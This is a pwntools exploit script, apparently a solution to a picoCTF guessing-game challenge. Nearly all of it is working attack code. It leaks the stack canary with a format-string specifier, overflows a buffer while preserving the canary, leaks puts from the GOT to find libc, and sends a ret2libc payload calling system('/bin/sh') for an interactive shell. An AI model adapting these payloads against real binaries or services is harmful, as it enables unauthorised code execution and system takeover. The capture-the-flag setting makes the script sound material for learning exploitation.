# stack cookies
# ret2libc
# nc jupiter.challenges.picoctf.org 13610

puts_plt = 0x80484c0 
puts_got = 0x8049fdc
addr_win = 0x0804876e

# offset_local_libc
puts_off = 0x6dc30	# 0xf7df21f0 - 0xf7d7b000
sys_off = 0x41790	# 0xf7dc7030 - 0xf7d7b000
bin_off = 0x18e363	# 0xf7f3a997 - 0xf7d7b000

from pwn import *
p = process("./vuln")
# p = remote("jupiter.challenges.picoctf.org", 13610)

# -------------------------------------------------------------------------------------------------
# leak number randoms
# for i in range(-4100, 4100):
#	p.recvuntil("like to guess?\n")
#	p.sendline(str(i))
#	if "Congrats!" in p.recvline():
#		print(i)
#		break
# -------------------------------------------------------------------------------------------------

# nums = -3983 - server // nums = -1327 - local
nums = -2975

# TURN 1: leak canary
p.recvuntil("to guess?")
p.sendline(str(nums))
p.recvuntil("Name?")

# leak canary	%128$p-%129$p-%130$p-%131$p-%132$p-%133$p-%134$p-%135$p-%136$p-%137$p-%138$p-%139$p

'''
parameter - 135
use gdb 
'''

para135 = "%135$p"
p.sendline(para135)
p.recvuntil("Congrats: 0x")

leak = int(p.recv(8), 16)
print("Canary: ")
print(hex(leak))

# padding = 528 = 512 + 4(canary) + 12

# TURN 2: leak puts_addr
p.recvuntil("to guess?")
p.sendline(str(nums))
p.recvuntil("Name?")

payload1 = "A" * 512 + p32(leak) + "A" * 12 + p32(puts_plt) + p32(addr_win) + p32(puts_got)
p.sendline(payload1)
p.recvlines(2)
puts_addr = u32(p.recv(4))
print("Puts_Address: ")
print(hex(puts_addr))

libc_base = puts_addr - puts_off # 0x673d0 # puts_off
sys_addr = libc_base + sys_off # 0x3cd80 # sys_off
binsh_addr = libc_base + bin_off # 0x17bb8f # bin_off

#TURN 3: get shell
p.recvuntil("Name?")
payload2 = "A" * 512 + p32(leak) + "A" * 12 + p32(sys_addr) + "AAAA" + p32(binsh_addr)
p.sendline(payload2)
p.recvlines(2)

p.interactive()

